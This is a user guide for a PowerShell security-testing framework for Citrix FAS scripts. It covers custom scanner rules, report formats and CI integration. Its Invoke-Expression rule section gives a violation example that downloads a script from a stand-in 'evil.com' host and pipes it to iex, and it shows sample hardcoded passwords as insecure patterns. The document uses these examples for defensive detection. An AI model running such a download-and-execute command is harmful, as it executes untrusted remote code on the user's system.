# Citrix FAS Security Tests Guide
## Comprehensive Security Testing for PowerShell Scripts

**Version:** 1.0.0
**Last Updated:** 2025-11-05
**Audience:** DevOps Engineers, Security Teams, FAS Administrators

---

## Table of Contents

1. [Overview](#overview)
2. [Quick Start](#quick-start)
3. [Installation](#installation)
4. [Usage](#usage)
5. [Security Rules Reference](#security-rules-reference)
6. [Output Formats](#output-formats)
7. [Integration](#integration)
8. [Troubleshooting](#troubleshooting)
9. [Best Practices](#best-practices)
10. [FAQ](#faq)

---

## Overview

The Citrix FAS Security Test Framework provides automated security testing for PowerShell scripts with focus on:

- **Credential Security**: Hardcoded passwords, API keys, plain-text credentials
- **Code Injection Prevention**: Invoke-Expression, dynamic code execution
- **Active Directory Validation**: Domain consistency, SID format validation
- **Best Practices**: Error handling, parameter validation, secure coding patterns

### Key Features

✅ **4 Custom Security Rules** targeting FAS-specific risks
✅ **PSScriptAnalyzer Integration** with 30+ built-in rules
✅ **SARIF 2.1.0 Output** for GitLab Security Dashboard
✅ **Intelligent Categorization** (Critical/High/Medium)
✅ **AD-Aware Detection** (SIDs, templates, domain names)
✅ **Comprehensive Reporting** (Console, JSON, SARIF)

---

## Quick Start

### 1. Install Dependencies

```powershell
# Install PSScriptAnalyzer
Install-Module -Name PSScriptAnalyzer -Force -Scope CurrentUser

# Install Pester for testing (optional)
Install-Module -Name Pester -Force -Scope CurrentUser -SkipPublisherCheck
```

### 2. Run Security Scan

```powershell
# Basic scan with console output
.\tests\Invoke-SecurityTests.ps1

# Scan specific script
.\tests\Invoke-SecurityTests.ps1 -Path ./scripts/Deploy-FAS.ps1

# Generate SARIF report for GitLab
.\tests\Invoke-SecurityTests.ps1 -OutputFormat SARIF -OutputPath ./reports/
```

### 3. Review Results

```
═══════════════════════════════════════════════════════
  CITRIX FAS SECURITY SCAN REPORT
═══════════════════════════════════════════════════════

Findings by Severity:
  Critical (Error):       0  ✓
  High (Warning):         2  ⚠️
  Medium (Information):   5  ℹ️
  ─────────────────────────────────────────────────
  Total Findings:         7

STATUS: WARNING ⚠️
Recommendation: Review high priority findings
```

---

## Installation

### Prerequisites

- **PowerShell**: Version 5.1 or PowerShell 7+
- **Operating System**: Windows Server 2016+ or Windows 10/11
- **PSScriptAnalyzer**: Version 1.21.0+
- **Pester** (optional): Version 5.x for running tests

### Installation Steps

1. **Clone Repository**

```bash
git clone https://github.com/dimi4ik/Citrix_daas_fas_install.git
cd Citrix_daas_fas_install
```

2. **Install PSScriptAnalyzer**

```powershell
Install-Module -Name PSScriptAnalyzer -Force -Scope CurrentUser
```

3. **Verify Installation**

```powershell
# Verify PSScriptAnalyzer
Get-Module -Name PSScriptAnalyzer -ListAvailable

# Verify custom rules
Get-ChildItem ./tests/SecurityRules/*.psm1

# Test custom rules loading
Import-Module ./tests/SecurityRules/Measure-HardcodedCredentials.psm1
Get-Command Measure-HardcodedCredentials
```

4. **Run Integration Tests** (optional)

```powershell
# Run Pester tests to validate setup
Invoke-Pester ./tests/SecurityRules.Tests/ -Output Detailed
```

---

## Usage

### Basic Usage

#### Scan All Scripts

```powershell
# Scan all PowerShell scripts in ./scripts/ directory
.\tests\Invoke-SecurityTests.ps1
```

#### Scan Specific File

```powershell
# Scan single script
.\tests\Invoke-SecurityTests.ps1 -Path ./scripts/Deploy-FAS.ps1
```

#### Scan with Specific Severity

```powershell
# Only show critical errors
.\tests\Invoke-SecurityTests.ps1 -Severity Error

# Show errors and warnings
.\tests\Invoke-SecurityTests.ps1 -Severity Error,Warning
```

### Advanced Usage

#### Generate Multiple Output Formats

```powershell
# Generate all formats (Console + JSON + SARIF)
.\tests\Invoke-SecurityTests.ps1 -OutputFormat All -OutputPath ./reports/
```

#### Verbose Output for Debugging

```powershell
# Enable verbose logging
.\tests\Invoke-SecurityTests.ps1 -Verbose
```

#### Custom Settings File

```powershell
# Use custom PSScriptAnalyzer settings
Invoke-ScriptAnalyzer -Path ./scripts/ `
                      -Settings ./PSScriptAnalyzerSettings.psd1 `
                      -Severity Error,Warning
```

---

## Security Rules Reference

### Critical Rules (Severity: Error)

#### FAS-CRED-001: Hardcoded Credentials

**What it detects:**
- Hardcoded passwords in string literals
- API keys and tokens
- Connection strings with credentials
- URLs with embedded username:password

**Examples:**

❌ **Violation:**
```powershell
$password = "MyPassword123"
$apiKey = "sk-abc123xyz"
$url = "https://admin:pass@api.com"
```

✅ **Correct:**
```powershell
$password = Read-Host "Enter password" -AsSecureString
$credential = Get-Credential
```

**Whitelisted (NOT flagged):**
- SIDs: `"S-1-5-21-1234567890-1234567890-1234567890-1234"`
- Templates: `"917Citrix_SmartcardLogon"`
- AD DNs: `"CN=Users,DC=domain,DC=com"`

---

#### FAS-CRED-002: Plain-Text Password Parameters

**What it detects:**
- `[string]$Password` parameters (should be `[SecureString]`)
- `ConvertTo-SecureString -AsPlainText` without proper context
- `New-Object PSCredential` with non-SecureString password

**Examples:**

❌ **Violation:**
```powershell
param([string]$Password)

$cred = New-Object PSCredential($user, $password)
```

✅ **Correct:**
```powershell
param([SecureString]$Password)
param([PSCredential]$Credential)

$securePass = Read-Host -AsSecureString
$cred = New-Object PSCredential($user, $securePass)
```

---

#### FAS-EXEC-001: Invoke-Expression Usage

**What it detects:**
- `Invoke-Expression` cmdlet usage
- `iex` alias
- `[ScriptBlock]::Create()` with dynamic content
- Downloaded content execution

**Examples:**

❌ **Violation:**
```powershell
Invoke-Expression "Get-Process"
iex $command
Invoke-WebRequest https://evil.com/script.ps1 | iex
```

✅ **Correct:**
```powershell
Get-Process
& $scriptBlock
```

**Why it's dangerous:**
- Code injection vulnerability
- Difficult to audit
- Untrusted input execution

---

### High Priority Rules (Severity: Warning)

#### FAS-AD-001: Domain Consistency

**What it detects:**
- Invalid SID formats
- Multiple domain parameters without validation
- UPN format issues
- Missing FAS Security Group SID validation

**Examples:**

❌ **Violation:**
```powershell
$sid = "S-1-5-21-INVALID"

param(
    [string]$UserDomain,
    [string]$ComputerDomain
)
# No validation that domains match
```

✅ **Correct:**
```powershell
[ValidatePattern('^S-1-5-21-\d+-\d+-\d+-\d+$')]
[string]$FASSecurityGroupSID

if ($UserDomain -ne $ComputerDomain) {
    throw "Domain mismatch detected"
}
```

---

### Built-in PSScriptAnalyzer Rules

In addition to custom rules, we enable 20+ built-in security rules:

| Rule | Severity | Description |
|------|----------|-------------|
| PSAvoidUsingPlainTextForPassword | Error | Detect plain-text password parameters |
| PSAvoidUsingConvertToSecureStringWithPlainText | Error | Insecure SecureString conversion |
| PSUsePSCredentialType | Error | Use PSCredential instead of string |
| PSAvoidUsingInvokeExpression | Error | Avoid Invoke-Expression |
| PSAvoidUsingUserNameAndPasswordParams | Error | Use PSCredential instead |
| PSAvoidUsingComputerNameHardcoded | Error | Avoid hardcoded computer names |
| PSAvoidUsingWriteHost | Warning | Use Write-Output instead |
| PSAvoidUsingCmdletAliases | Warning | Use full cmdlet names |
| PSUseShouldProcessForStateChangingFunctions | Information | Implement -WhatIf/-Confirm |

---

## Output Formats

### Console Output

**Default format** with color-coded findings:

```
═══════════════════════════════════════════════════════
  CRITICAL FINDINGS (BUILD BREAKING)
═══════════════════════════════════════════════════════

  [FAS-CRED-001-HardcodedCredentials]
  File:    scripts/Deploy-FAS.ps1:123
  Message: Hardcoded password detected. Use SecureString instead.
  Recommendation: Use Read-Host -AsSecureString
```

**Exit Codes:**
- `0` - No issues found
- `1` - Critical errors found (build fails)
- `2` - Warnings found (review recommended)
- `3` - Script execution error

---

### JSON Output

**Detailed structured data** for automation:

```json
{
  "ScanMetadata": {
    "ScannerName": "FAS-Security-Scanner",
    "ScanDate": "2025-11-05T10:30:00Z",
    "TargetPath": "./scripts/",
    "TotalFindings": 7
  },
  "Summary": {
    "Critical": 0,
    "High": 2,
    "Medium": 5
  },
  "AllFindings": [...]
}
```

**Usage:**
```powershell
.\tests\Invoke-SecurityTests.ps1 -OutputFormat JSON -OutputPath ./reports/

# Parse JSON programmatically
$report = Get-Content ./reports/security-report-*.json | ConvertFrom-Json
if ($report.Summary.Critical -gt 0) {
    throw "Critical security issues found!"
}
```

---

### SARIF Output (GitLab Integration)

**SARIF 2.1.0 format** for GitLab Security Dashboard:

```json
{
  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
  "version": "2.1.0",
  "runs": [
    {
      "tool": {
        "driver": {
          "name": "FAS-Security-Scanner",
          "version": "1.0.0"
        }
      },
      "results": [...]
    }
  ]
}
```

**Benefits:**
- ✅ Native GitLab Security Dashboard support
- ✅ Vulnerability tracking and trending
- ✅ Merge request blocking on critical issues
- ✅ Historical security metrics

---

## Integration

### Pre-Commit Hook (Recommended)

Create `.git/hooks/pre-commit`:

```bash
#!/bin/bash
# Pre-commit security scan

echo "Running security scan..."
pwsh -File ./tests/Invoke-SecurityTests.ps1 -Severity Error

if [ $? -ne 0 ]; then
    echo "❌ Security scan failed! Fix critical issues before committing."
    exit 1
fi

echo "✅ Security scan passed!"
exit 0
```

Make executable:
```bash
chmod +x .git/hooks/pre-commit
```

---

### VS Code Integration

Add to `.vscode/settings.json`:

```json
{
  "powershell.scriptAnalysis.enable": true,
  "powershell.scriptAnalysis.settingsPath": "./PSScriptAnalyzerSettings.psd1"
}
```

**Benefits:**
- Real-time security feedback while coding
- Inline violation highlighting
- Quick fix suggestions

---

### Automated Scanning (Scheduled)

```powershell
# Daily security scan via Task Scheduler
$trigger = New-ScheduledTaskTrigger -Daily -At 2AM
$action = New-ScheduledTaskAction -Execute "pwsh.exe" `
    -Argument "-File C:\FAS\tests\Invoke-SecurityTests.ps1 -OutputFormat All"

Register-ScheduledTask -TaskName "FAS-Security-Scan" `
                       -Trigger $trigger `
                       -Action $action
```

---

## Troubleshooting

### Common Issues

#### 1. PSScriptAnalyzer Not Found

**Error:**
```
Module 'PSScriptAnalyzer' not found
```

**Solution:**
```powershell
Install-Module -Name PSScriptAnalyzer -Force -Scope CurrentUser
Import-Module PSScriptAnalyzer
```

---

#### 2. Custom Rules Not Loading

**Error:**
```
Custom rules not detected
```

**Solution:**
```powershell
# Verify rules path in settings
$settings = Import-PowerShellDataFile ./PSScriptAnalyzerSettings.psd1
$settings.CustomRulePath

# Manually import rules
Import-Module ./tests/SecurityRules/Measure-HardcodedCredentials.psm1 -Force
```

---

#### 3. False Positives

**Issue:** SID values flagged as hardcoded credentials

**Solution:** Our rules are AD-aware and should NOT flag SIDs. If this happens:

```powershell
# Suppress specific finding with comment
$FASSecurityGroupSID = "S-1-5-21-xxx"  # PSScriptAnalyzer: FAS-CRED-001
```

---

#### 4. Performance Issues

**Issue:** Scan takes too long

**Solution:**
```powershell
# Scan specific files only
.\tests\Invoke-SecurityTests.ps1 -Path ./scripts/Deploy-FAS.ps1

# Reduce severity levels
.\tests\Invoke-SecurityTests.ps1 -Severity Error
```

---

## Best Practices

### 1. Run Security Scans Early and Often

✅ **Do:**
- Run scan before every commit
- Integrate into CI/CD pipeline
- Set up pre-commit hooks

❌ **Don't:**
- Wait until deployment to scan
- Ignore warnings ("we'll fix it later")

---

### 2. Fix Critical Issues Immediately

**Priority Order:**
1. **Critical (Error)**: Hardcoded credentials, Invoke-Expression → **MUST FIX**
2. **High (Warning)**: Domain consistency, weak types → **SHOULD FIX**
3. **Medium (Info)**: Best practices, code style → **NICE TO FIX**

---

### 3. Use Secure Credential Patterns

**Always use:**
```powershell
# Secure patterns
param([PSCredential]$Credential)
param([SecureString]$Password)

$cred = Get-Credential
$securePass = Read-Host -AsSecureString
```

**Never use:**
```powershell
# Insecure patterns
param([string]$Password)
$password = "hardcoded"
ConvertTo-SecureString "password" -AsPlainText -Force
```

---

### 4. Validate AD Parameters

```powershell
# Always validate SIDs
[ValidatePattern('^S-1-5-21-\d+-\d+-\d+-\d+$')]
[string]$FASSecurityGroupSID

# Check domain consistency
if ($UserDomain -ne $ComputerDomain) {
    throw "Cross-domain authentication not supported"
}
```

---

### 5. Document Security Exceptions

If you MUST suppress a rule:

```powershell
# Documented exception with justification
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('FAS-CRED-001', '',
    Justification='Template name contains "password" keyword but is not a credential')]
$templateName = "917Citrix_SmartcardLogon_Password_Enabled"
```

---

## FAQ

### Q: Can I customize security rules?

**A:** Yes! Create additional rules in `./tests/SecurityRules/`:

```powershell
function Measure-MyCustomRule {
    param($ScriptBlockAst)

    # Your detection logic
    # Return DiagnosticRecord array
}

Export-ModuleMember -Function Measure-MyCustomRule
```

---

### Q: How do I exclude specific files?

**A:** Modify `PSScriptAnalyzerSettings.psd1`:

```powershell
@{
    ExcludeRules = @()
    IncludeRules = @('*')

    # Exclude specific paths
    ExcludePath = @(
        './scripts/ThirdParty/*',
        './scripts/Legacy/*'
    )
}
```

---

### Q: Can I use this in CI/CD?

**A:** Absolutely! See [Integration](#integration) section and check `docs/security-tests-implementation-plan.md` for GitLab CI/CD examples.

---

### Q: What if I get false positives?

**A:** Use suppression with justification:

```powershell
[Diagnostics.CodeAnalysis.SuppressMessageAttribute('RuleName', '', Justification='Reason')]
```

Or report the issue: https://github.com/dimi4ik/Citrix_daas_fas_install/issues

---

### Q: How often should I run scans?

**A:** Recommended schedule:
- **Before every commit**: Pre-commit hook
- **Daily**: Scheduled scan for drift detection
- **Before merge**: CI/CD pipeline
- **Monthly**: Full audit with manual review

---

## Resources

### Documentation
- [Security Rules Reference](./security-rules-reference.md)
- [Troubleshooting Guide](./troubleshooting-security-tests.md)
- [Implementation Plan](./security-tests-implementation-plan.md)

### External Links
- [PSScriptAnalyzer Documentation](https://github.com/PowerShell/PSScriptAnalyzer)
- [SARIF Specification](https://docs.oasis-open.org/sarif/sarif/v2.1.0/)
- [Citrix FAS Documentation](https://docs.citrix.com/en-us/federated-authentication-service)

---

**Version:** 1.0.0
**Maintained by:** FAS Security Team
**Last Updated:** 2025-11-05
